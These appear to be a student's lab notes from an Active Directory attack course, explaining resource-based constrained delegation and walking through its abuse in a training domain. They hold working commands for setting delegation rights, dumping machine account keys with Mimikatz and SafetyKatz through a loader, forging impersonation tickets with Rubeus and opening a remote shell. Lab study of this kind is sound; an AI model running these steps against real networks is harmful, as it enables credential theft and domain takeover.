moves delegation authority to the resource/service administrator
- instead of SPNs on msDS-AllowedToDelegate on the front-end service (like website), access is controlled by the security descriptor msDS-AllowedToActOnBehalfOfOtherIdentity (visible as PrincipalsAllowedToDelegateToAccount) on the resource/service like SQL Server service
- the resource/service admin can configure this delegation whereas for other types, SeEnableDelegation privileges are required which are, by default, only available to DA
- basically saying "i want admin access to this machine if I have admin access to these machines" where the machines you have admin access to are the machines you created
	- machines you created are the first hop, target machine is the second hop

to abuse RBCD, you need two permissions
1. write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity
2. control over an object which has SPN configured (like admin access to a domain-joined machine or the ability to join a machine to domain msDS-MachineAccountQuota)

![Pasted image 20260221072315](assets/Pasted%20image%2020260221072315.png)
- ciaadmin has GenericWrite over dcorp-mgmt

Using the ActiveDirectory module, configure RBCD on dcorp-mgmt for student machines
`$comps = 'dcorp-student1$','dcorp-student2$'`
`Set-ADComputer -Identity dcorp-mgmt -PrincipalAllowedToDelegateToAccount $comps`

Now get the privileges of dcorp-student machines by extracting their AES keys
`Invoke-Mimikatz -Command '"sekurlsa::ekeys"'`

Use the AES key of dcorp-studentx$ with Rubeus and access dcorp-mgmt as ANY user 
`Rubeus.exe s4u /user:dcorp-student1$ /aes256:<aes_key> /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt`
- http may be different, just depends on SPN

connect to dcorp-mgmt
`winrs -r:dcorp-mgmt cmd.exe`



# Learning Objective 17

## Find a computer object in dcorp domain where we have Write permissions

![Pasted image 20260221073129](assets/Pasted%20image%2020260221073129.png)

## Abuse the Write permissions to access that computer as Domain Admin

got access to ciadmin from abusing Jenkins
- to get a reminder, go to video 40 12:00

configure RBCD
- with PowerView
`Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-student1$' -Verbose`

extract credentials for machine account created
`C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`
- always use key for S-1-5-18

use credentials for machine we created to delegate for target machine
`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-student1$ /aes256:<aes_key> /impersonateuser:administrator /ptt`
- imports ticket for target service (in our case, http for dcorp-mgmt)

